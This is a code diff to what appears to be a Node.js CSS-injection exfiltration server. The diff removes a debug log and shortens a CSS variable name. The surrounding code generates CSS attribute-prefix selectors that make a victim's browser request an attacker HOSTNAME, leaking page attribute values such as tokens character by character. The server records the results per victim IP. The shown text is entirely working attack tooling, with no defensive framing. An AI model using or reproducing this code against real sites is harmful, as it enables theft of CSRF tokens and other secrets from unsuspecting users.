@@ -128,8 +128,7 @@ app.use('/c', function(request, response){
     if(!hasToken(tokens,{tag, attribute, value})) {
         tokens.push({tag, attribute, value});
         session.get(ip).set('foundToken',true);
-    }    
-    console.log("Found!!!", {tag, attribute, value});     
+    }       
 });
 
 const genResponse = (request, response, elementNumber) => {
@@ -152,7 +151,7 @@ const genResponse = (request, response, elementNumber) => {
             }
             const prefix = prefixes.get(prefixKey);
             css += CHARS.map(e => ('html:has('+element+'['+attribute+'^="' + escapeCSS(prefix + e) + '"]'+generateNotSelectors(tokens, element, attribute)+')' + '{'+variablePrefix+'s:url(' + HOSTNAME + '/l?e='+(elementNumber)+'&n='+n+'&p_'+element[0]+attribute[0]+elementNumber+'=' + encodeURIComponent(prefix + e) +');}')).join('');
-            css += 'html:has(['+attribute+'="'+ escapeCSS(prefix) + '"]){'+variablePrefix+'full:url(' + HOSTNAME + '/c?t='+element+'&a='+attribute+'&e='+elementNumber+'&v=' + encodeURIComponent(prefix) + ');}';
+            css += 'html:has(['+attribute+'="'+ escapeCSS(prefix) + '"]){'+variablePrefix+'f:url(' + HOSTNAME + '/c?t='+element+'&a='+attribute+'&e='+elementNumber+'&v=' + encodeURIComponent(prefix) + ');}';
         }
     }
     if(n === 0 && elementNumber === 0) {  
@@ -162,7 +161,7 @@ const genResponse = (request, response, elementNumber) => {
                     for(let j=0;j<MAX_VALUE;j++) {         
                         const variablePrefix = '--'+getPrefix(element,attribute,i)+'-'+j;  
                         properties.push('var('+variablePrefix+'s,none)');              
-                        properties.push('var('+variablePrefix+'full,none)');                    
+                        properties.push('var('+variablePrefix+'f,none)');                    
                     }
                 }
             }
